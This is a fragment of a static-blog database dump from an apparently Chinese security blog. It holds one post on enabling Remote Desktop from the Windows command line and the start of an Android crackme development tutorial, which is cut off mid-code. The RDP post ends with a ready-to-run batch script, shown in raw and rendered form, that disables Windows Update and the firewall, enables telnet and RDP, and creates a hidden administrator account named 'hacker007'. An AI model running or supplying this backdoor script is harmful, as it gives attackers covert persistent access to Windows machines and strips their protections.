":1501113434177},{"_id":"public/img/dreamcruise.jpg","hash":"7120181b492a7bf56ded61929e93170036cb4696","modified":1501113434178},{"_id":"public/2017/07/Android开发及破解入门实例/Screenshot_01.png","hash":"2d6bfe203f570cd122bc6b3adb3b610a2a81aee4","modified":1501113434182},{"_id":"public/2017/07/Android开发及破解入门实例/Screenshot_02.png","hash":"b89770c2cad07c875cb713bef64298ddc61dcb3f","modified":1501113434182},{"_id":"public/2017/07/Android开发及破解入门实例/Screenshot_04.png","hash":"da7fbbd0943d2013d8922c20351240bc768d9e8d","modified":1501113434183},{"_id":"public/2017/07/Web-API接口安全了解/screenshot22.png","hash":"86394d72f4867d731aad0605c9b33b50d81f6209","modified":1501113434183},{"_id":"public/2017/07/Web-API接口安全了解/screenshot41.png","hash":"17b3500ba8ea00f303365be16c0478bb5ad719bf","modified":1501113434183},{"_id":"public/2017/07/Web-API接口安全了解/screenshot42.png","hash":"2332f0defe83be568d76114aa8e9633637dce13a","modified":1501113434183},{"_id":"public/slider.445162.js","hash":"e21c3c2cf663d7a4fb0d77f43ae1a148553a7cca","modified":1501113434188},{"_id":"public/main.b3331d.css","hash":"7d0162a4618e8026bd23779f3120c09c83197b9f","modified":1501113434188},{"_id":"public/main.b3331d.js","hash":"0e98e3674c7687ae4ff7bdcecb05e15434c46e0d","modified":1501113434188},{"_id":"public/mobile.8d90af.js","hash":"cf2ab659138db5abc70e3e0d7bc64f50d48e834d","modified":1501113434188},{"_id":"public/2017/07/Web-API接口安全了解/screenshot04.png","hash":"8845ef07478281098a19d933da144ed4867d8324","modified":1501113434188},{"_id":"public/2017/07/Web-API接口安全了解/screenshot01.png","hash":"65fb69fa2b3d8dc34c55561dc325e20cfaf5248f","modified":1501113434188},{"_id":"public/2017/07/Web-API接口安全了解/screenshot24.png","hash":"e16a5f46d299d055230c07e99927a331e5d51af3","modified":1501113434188},{"_id":"public/2017/07/Web-API接口安全了解/screenshot21.png","hash":"334d450d985eba5522d5fc2fb3dbe740650bacad","modified":1501113434188},{"_id":"public/2017/07/Web-API接口安全了解/screenshot03.png","hash":"da4176c81eb0d9210454fa475bd89f4ce49880ad","modified":1501113434190},{"_id":"public/2017/07/Web-API接口安全了解/screenshot02.png","hash":"2e8dce76368750c2b42be22f0cbacbf06a703470","modified":1501113434190},{"_id":"public/2017/07/Web-API接口安全了解/screenshot23.png","hash":"5da34a38b93de709c7cebacea9d529ed7cdecf0a","modified":1501113434190},{"_id":"public/2017/07/Web-API接口安全了解/screenshot31.png","hash":"d582b4bf715b137bf052943fb6758fde1305ec1f","modified":1501113434190},{"_id":"public/2017/07/Web-API接口安全了解/screenshot50.png","hash":"63276eb7fed5b41c7e4db83412a402772ffa97ad","modified":1501113434191},{"_id":"public/2017/07/Android开发及破解入门实例/Screenshot_03.png","hash":"81fe888be77695204e2602d0146d8b206d8d4cca","modified":1501113434193},{"_id":"public/2017/07/Web-API接口安全了解/screenshot32.png","hash":"66ef1ef498677298ed01c194b42902f9917b6444","modified":1501113434195}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Enable RDP through cmd line","date":"2017-04-26T11:21:29.000Z","_content":"## 开启RDP\n通过命令行修改注册表。\n\n```bash\n# 开启RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# 关闭RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n# 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections\n\n```\n<!-- more -->\n## RDP端口\n\n```bash\n# 查询rdp端口号\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber\n\n```\n## 防火墙相关 [Netsh AdvFirewall](https://technet.microsoft.com/en-us/library/dd736198(v=ws.10).aspx)\n```bash\n# 防火墙状态\nnetsh advfirewall monitor show firewall\n\n# 允许访问3389端口\nnetsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n\n# 关闭防火墙\nnetsh firewall set opmode mode=disable\n\n```\n\n## 开启远程协助\n```bash\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n```\n\n## 其它\n```bash\n# 从进程中查找rdp进程\ntasklist  /svc | find \"TermService\"\n# 根据pid（1316）查询端口号\nnetstat -ano | find \"1316\"\n```\n\n\n## 脚本(maybe dangerous)  <未实际使用，仅供参考>\n```bash\n@echo off\n\nREM ****************\nREM Disable off \"AUTO UPDATE\"\nREM ****************\nsc config wuauserv start= disabled\nnet stop wuauserv\n\nREM ****************\nREM Disable windows xp Firewall\nREM ****************\nnetsh firewall set opmode disable\n\nREM ****************\nREM Enable TELNET\nREM ****************\nsc config tlntsvr start= auto\nnet start telnet\n\nREM ****************\nREM Enable Remote Desktop\nREM ****************\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nREM ***************\nREM Create a HIDDEN USER usr= hack007, pass= dani\nREM ***************\nnet user hacker007 dani /add\nnet localgroup \"Administrators\" /add hacker007\nnet localgroup \"Users\" /del hacker007\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker007 /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f\n\n```","source":"_posts/Enable-RDP-through-cmd-line.md","raw":"---\ntitle: Enable RDP through cmd line\ndate: 2017-04-26 19:21:29\ntags:\n---\n## 开启RDP\n通过命令行修改注册表。\n\n```bash\n# 开启RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# 关闭RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n# 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections\n\n```\n<!-- more -->\n## RDP端口\n\n```bash\n# 查询rdp端口号\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber\n\n```\n## 防火墙相关 [Netsh AdvFirewall](https://technet.microsoft.com/en-us/library/dd736198(v=ws.10).aspx)\n```bash\n# 防火墙状态\nnetsh advfirewall monitor show firewall\n\n# 允许访问3389端口\nnetsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n\n# 关闭防火墙\nnetsh firewall set opmode mode=disable\n\n```\n\n## 开启远程协助\n```bash\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n```\n\n## 其它\n```bash\n# 从进程中查找rdp进程\ntasklist  /svc | find \"TermService\"\n# 根据pid（1316）查询端口号\nnetstat -ano | find \"1316\"\n```\n\n\n## 脚本(maybe dangerous)  <未实际使用，仅供参考>\n```bash\n@echo off\n\nREM ****************\nREM Disable off \"AUTO UPDATE\"\nREM ****************\nsc config wuauserv start= disabled\nnet stop wuauserv\n\nREM ****************\nREM Disable windows xp Firewall\nREM ****************\nnetsh firewall set opmode disable\n\nREM ****************\nREM Enable TELNET\nREM ****************\nsc config tlntsvr start= auto\nnet start telnet\n\nREM ****************\nREM Enable Remote Desktop\nREM ****************\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nREM ***************\nREM Create a HIDDEN USER usr= hack007, pass= dani\nREM ***************\nnet user hacker007 dani /add\nnet localgroup \"Administrators\" /add hacker007\nnet localgroup \"Users\" /del hacker007\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker007 /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f\n\n```","slug":"Enable-RDP-through-cmd-line","published":1,"updated":"2017-06-08T13:13:41.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj5lo6hrz0000vquvzg2jyhes","content":"<h2 id=\"开启RDP\"><a href=\"#开启RDP\" class=\"headerlink\" title=\"开启RDP\"></a>开启RDP</h2><p>通过命令行修改注册表。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 开启RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"><span class=\"comment\"># 关闭RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 1 /f</div><div class=\"line\"><span class=\"comment\"># 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"RDP端口\"><a href=\"#RDP端口\" class=\"headerlink\" title=\"RDP端口\"></a>RDP端口</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 查询rdp端口号</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"</span> /v PortNumber</div></pre></td></tr></table></figure>\n<h2 id=\"防火墙相关-Netsh-AdvFirewall-aspx\"><a href=\"#防火墙相关-Netsh-AdvFirewall-aspx\" class=\"headerlink\" title=\"防火墙相关 Netsh AdvFirewall.aspx)\"></a>防火墙相关 <a href=\"https://technet.microsoft.com/en-us/library/dd736198(v=ws.10\" target=\"_blank\" rel=\"external\">Netsh AdvFirewall</a>.aspx)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 防火墙状态</span></div><div class=\"line\">netsh advfirewall monitor show firewall</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 允许访问3389端口</span></div><div class=\"line\">netsh advfirewall firewall add rule name=<span class=\"string\">\"Open Port 3389\"</span> dir=<span class=\"keyword\">in</span> action=allow protocol=TCP localport=3389</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 关闭防火墙</span></div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode mode=<span class=\"built_in\">disable</span></div></pre></td></tr></table></figure>\n<h2 id=\"开启远程协助\"><a href=\"#开启远程协助\" class=\"headerlink\" title=\"开启远程协助\"></a>开启远程协助</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fAllowToGetHelp /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>\n<h2 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 从进程中查找rdp进程</span></div><div class=\"line\">tasklist  /svc | find <span class=\"string\">\"TermService\"</span></div><div class=\"line\"><span class=\"comment\"># 根据pid（1316）查询端口号</span></div><div class=\"line\">netstat -ano | find <span class=\"string\">\"1316\"</span></div></pre></td></tr></table></figure>\n<h2 id=\"脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\"><a href=\"#脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\" class=\"headerlink\" title=\"脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;\"></a>脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\">@<span class=\"built_in\">echo</span> off</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable off <span class=\"string\">\"AUTO UPDATE\"</span></div><div class=\"line\">REM ****************</div><div class=\"line\">sc config wuauserv start= disabled</div><div class=\"line\">net stop wuauserv</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable windows xp Firewall</div><div class=\"line\">REM ****************</div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode <span class=\"built_in\">disable</span></div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable TELNET</div><div class=\"line\">REM ****************</div><div class=\"line\">sc config tlntsvr start= auto</div><div class=\"line\">net start telnet</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable Remote Desktop</div><div class=\"line\">REM ****************</div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"></div><div class=\"line\">REM ***************</div><div class=\"line\">REM Create a HIDDEN USER usr= hack007, pass= dani</div><div class=\"line\">REM ***************</div><div class=\"line\">net user hacker007 dani /add</div><div class=\"line\">net localgroup <span class=\"string\">\"Administrators\"</span> /add hacker007</div><div class=\"line\">net localgroup <span class=\"string\">\"Users\"</span> /del hacker007</div><div class=\"line\">reg add <span class=\"string\">\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\"</span> /v hacker007 /t REG_DWORD /d 0 /f</div><div class=\"line\">reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h2 id=\"开启RDP\"><a href=\"#开启RDP\" class=\"headerlink\" title=\"开启RDP\"></a>开启RDP</h2><p>通过命令行修改注册表。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 开启RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"><span class=\"comment\"># 关闭RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 1 /f</div><div class=\"line\"><span class=\"comment\"># 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections</div></pre></td></tr></table></figure>","more":"<h2 id=\"RDP端口\"><a href=\"#RDP端口\" class=\"headerlink\" title=\"RDP端口\"></a>RDP端口</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 查询rdp端口号</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"</span> /v PortNumber</div></pre></td></tr></table></figure>\n<h2 id=\"防火墙相关-Netsh-AdvFirewall-aspx\"><a href=\"#防火墙相关-Netsh-AdvFirewall-aspx\" class=\"headerlink\" title=\"防火墙相关 Netsh AdvFirewall.aspx)\"></a>防火墙相关 <a href=\"https://technet.microsoft.com/en-us/library/dd736198(v=ws.10\">Netsh AdvFirewall</a>.aspx)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 防火墙状态</span></div><div class=\"line\">netsh advfirewall monitor show firewall</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 允许访问3389端口</span></div><div class=\"line\">netsh advfirewall firewall add rule name=<span class=\"string\">\"Open Port 3389\"</span> dir=<span class=\"keyword\">in</span> action=allow protocol=TCP localport=3389</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 关闭防火墙</span></div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode mode=<span class=\"built_in\">disable</span></div></pre></td></tr></table></figure>\n<h2 id=\"开启远程协助\"><a href=\"#开启远程协助\" class=\"headerlink\" title=\"开启远程协助\"></a>开启远程协助</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fAllowToGetHelp /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>\n<h2 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 从进程中查找rdp进程</span></div><div class=\"line\">tasklist  /svc | find <span class=\"string\">\"TermService\"</span></div><div class=\"line\"><span class=\"comment\"># 根据pid（1316）查询端口号</span></div><div class=\"line\">netstat -ano | find <span class=\"string\">\"1316\"</span></div></pre></td></tr></table></figure>\n<h2 id=\"脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\"><a href=\"#脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\" class=\"headerlink\" title=\"脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;\"></a>脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\">@<span class=\"built_in\">echo</span> off</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable off <span class=\"string\">\"AUTO UPDATE\"</span></div><div class=\"line\">REM ****************</div><div class=\"line\">sc config wuauserv start= disabled</div><div class=\"line\">net stop wuauserv</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable windows xp Firewall</div><div class=\"line\">REM ****************</div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode <span class=\"built_in\">disable</span></div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable TELNET</div><div class=\"line\">REM ****************</div><div class=\"line\">sc config tlntsvr start= auto</div><div class=\"line\">net start telnet</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable Remote Desktop</div><div class=\"line\">REM ****************</div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"></div><div class=\"line\">REM ***************</div><div class=\"line\">REM Create a HIDDEN USER usr= hack007, pass= dani</div><div class=\"line\">REM ***************</div><div class=\"line\">net user hacker007 dani /add</div><div class=\"line\">net localgroup <span class=\"string\">\"Administrators\"</span> /add hacker007</div><div class=\"line\">net localgroup <span class=\"string\">\"Users\"</span> /del hacker007</div><div class=\"line\">reg add <span class=\"string\">\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\"</span> /v hacker007 /t REG_DWORD /d 0 /f</div><div class=\"line\">reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>"},{"title":"Android开发及破解入门实例","date":"2017-07-03T08:12:55.000Z","_content":">   原本尝试刷一把某SRC，结果因为其对外服务的基本都是APP，故而尝试逆向其APK。  结果可想而知，一脸懵逼，无从入手。 故而找了个本《Android软件安全与逆向分析》，照着学学。\n\n## 开发环境安装\n\n[Android开发者官网](https://developer.android.com)\n\n[Android Studio下载页面](https://developer.android.com/studio/index.html)\n\n[Android Studio 2.3.3.0 for mac下载直连](https://dl.google.com/dl/android/studio/install/2.3.3.0/android-studio-ide-162.4069837-mac.dmg)\n\n[Android NDK](https://developer.android.com/ndk/downloads/index.html) # 其实这个工具在这里并没有用到，可以等后续再下载安装。\n\n\\# Android Studio包含了JDK，故而不需要单独安装JDK。\n上述链接应该是都需要翻墙才能访问。\n\n<!--more-->\n\n## 项目编码\n打开AS，一路Next，就新建好一个项目。\n\n>   第一次新建项目，可能会卡住，跟一个叫gradle的东西相关，可以选择慢慢等，也可以考虑手动从官方下载（[gradle-3.3](https://services.gradle.org/distributions/gradle-3.3-all.zip\n)），然后替换了本地下载尚未下载完成的~/.gradle/wrapper/dists/gradle-3.3-all/55gk2rcmfc6p2dg9u9ohc3hw9/gradle-3.3-all.zip文件。\n\n打开app/res/layout/activity_main.xml,设计layout。\n\n采用Android最新的约束性布局ConstraintLayout。\n\n![设计效果](Android开发及破解入门实例/constraintLayout.png)\n具体的xml代码如下：\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.constraint.ConstraintLayout\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\"cn.oddboy.xx.crackme01.MainActivity\"\n    tools:layout_editor_absoluteY=\"81dp\"\n    tools:layout_editor_absoluteX=\"0dp\">\n\n    <TextView\n        android:id=\"@+id/textView\"\n        android:layout_width=\"368dp\"\n        android:layout_height=\"25dp\"\n        android:text=\"@string/str_androidInstance\"\n        android:textAlignment=\"center\"\n        android:textAllCaps=\"false\"\n        android:textSize=\"18sp\"\n        android:textStyle=\"bold\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        app:layout_constraintBottom_toTopOf=\"@+id/userName\"\n        app:layout_constraintTop_toTopOf=\"parent\" />\n\n    <TextView\n        android:id=\"@+id/textView2\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"17dp\"\n        android:text=\"@string/str_serialNo\"\n        android:textAlignment=\"center\"\n        android:textSize=\"14sp\"\n        app:layout_constraintBottom_toBottomOf=\"@+id/sn\"\n        app:layout_constraintTop_toTopOf=\"@+id/sn\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        app:layout_constraintRight_toLeftOf=\"@+id/sn\" />\n\n    <TextView\n        android:id=\"@+id/textView3\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"17dp\"\n        android:text=\"@string/str_username\"\n        android:textAlignment=\"center\"\n        android:textSize=\"14sp\"\n        app:layout_constraintBottom_toBottomOf=\"@+id/userName\"\n        app:layout_constraintTop_toTopOf=\"@+id/userName\"\n        app:layout_constraintRight_toLeftOf=\"@+id/userName\"\n        app:layout_constraintLeft_toLeftOf=\"parent\" />\n\n    <EditText\n        android:id=\"@+id/sn\"\n        android:layout_width=\"215dp\"\n        android:layout_height=\"43dp\"\n        android:ems=\"10\"\n        android:hint=\"@string/str_input16chars\"\n        android:inputType=\"textPersonName\"\n        app:layout_constraintBottom_toTopOf=\"@+id/button\"\n        app:layout_constraintLeft_toLeftOf=\"@+id/userName\"\n        app:layout_constraintRight_toRightOf=\"@+id/userName\"\n        app:layout_constraintTop_toBottomOf=\"@+id/userName\" />\n\n    <EditText\n        android:id=\"@+id/userName\"\n        android:layout_width=\"215dp\"\n        android:layout_height=\"43dp\"\n        android:ems=\"10\"\n        android:hint=\"@string/str_pleaseinputusername\"\n        android:inputType=\"textPersonName\"\n        app:layout_constraintBottom_toTopOf=\"@+id/sn\"\n        app:layout_constraintLeft_toRightOf=\"@+id/textView3\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintTop_toBottomOf=\"@+id/textView\" />\n\n    <Button\n        android:id=\"@+id/button\"\n        android:layout_width=\"88dp\"\n        android:layout_height=\"48dp\"\n        android:text=\"@string/str_register\"\n        app:layout_constraintTop_toBottomOf=\"@+id/sn\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        android:layout_marginTop=\"-13dp\"\n        app:layout_constraintHorizontal_bias=\"0.858\" />\n\n</android.support.constraint.ConstraintLayout>\n\n```\n\n打开app/java/cn.oddboy.xx.crackme01/MainActivity.java,编写逻辑代码。\n\n```\npackage cn.oddboy.xx.crackme01;\n\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.Toast;\n\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\n\npublic class MainActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        setTitle(R.string.unregister);\n        final EditText edit_userName=(EditText)findViewById(R.id.userName);\n        final EditText edit_sn=(EditText)findViewById(R.id.sn);\n        final Button btn_reg=(Button)findViewById(R.id.button);\n        btn_reg.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                if (!checkSN(edit_userName.getText().toString().trim(),edit_sn.getText().toString().trim())) {\n                    Toast.makeText(MainActivity.this, R.string.unsucessed, Toast.LENGTH_SHORT).show();\n                }else {\n                    Toast.makeText(MainActivity.this,\n                            R.string.successed,Toast.LENGTH_SHORT).show();\n                    btn_reg.setEnabled(false);\n                    setTitle(R.string.registered);\n                }\n            }\n        });\n    }\n    public static String bytesToHex(byte[] in) {\n        final StringBuilder builder = new StringBuilder();\n        for(byte b : in) {\n            builder.append(String.format(\"%02x\", b));\n        }\n        return builder.toString();\n    }\n    private boolean checkSN(String userName, String sn){\n        try{\n            if 